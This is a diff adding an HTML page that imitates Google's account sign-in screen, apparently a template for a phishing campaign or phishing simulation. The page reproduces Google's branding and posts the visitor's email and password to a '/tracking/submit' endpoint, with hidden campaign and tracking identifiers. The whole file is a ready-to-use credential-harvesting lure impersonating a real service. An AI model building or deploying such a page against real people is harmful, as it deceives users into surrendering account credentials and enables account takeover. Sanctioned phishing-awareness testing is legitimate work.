@@ -1,0 +1,52 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Google Account</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{width:100%;max-width:450px;padding:48px 40px 36px;background:#fff;border-radius:28px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
+.logo{text-align:center;margin-bottom:16px}
+.logo img{height:75px}
+h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:4px}
+h2{font-size:16px;font-weight:400;color:#202124;text-align:center;margin-bottom:32px}
+.form-group{margin-bottom:20px;position:relative}
+input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:.2s}
+input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
+.label{position:absolute;top:-8px;left:12px;background:#fff;padding:0 4px;font-size:12px;color:#1a73e8;display:none}
+input:focus+.label,input:not(:placeholder-shown)+.label{display:block}
+.btn{width:100%;padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:12px}
+.btn:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
+.help{text-align:left;margin-top:8px}
+.help a{color:#1a73e8;text-decoration:none;font-size:14px}
+.footer{text-align:center;margin-top:32px;font-size:12px;color:#5f6368}
+.lang{text-align:center;margin-top:20px;font-size:12px;color:#5f6368}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo"><img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google"></div>
+<h1>Sign in</h1>
+<h2>Use your Google Account</h2>
+<form action="/tracking/submit" method="POST">
+<input type="hidden" name="campaign_id" value="##campaign_id##">
+<input type="hidden" name="tracking_id" value="##tracking_id##">
+<div class="form-group">
+<input type="email" name="email" placeholder=" " required autofocus>
+<label class="label">Email or phone</label>
+</div>
+<div class="form-group">
+<input type="password" name="password" placeholder=" " required>
+<label class="label">Enter your password</label>
+</div>
+<div class="help"><a href="#">Forgot email?</a></div>
+<button type="submit" class="btn">Next</button>
+</form>
+<div class="footer">Not your computer? Use a private browsing window to sign in.</div>
+<div class="lang"><a href="#">English (United States)</a></div>
+</div>
+</body>
+</html>
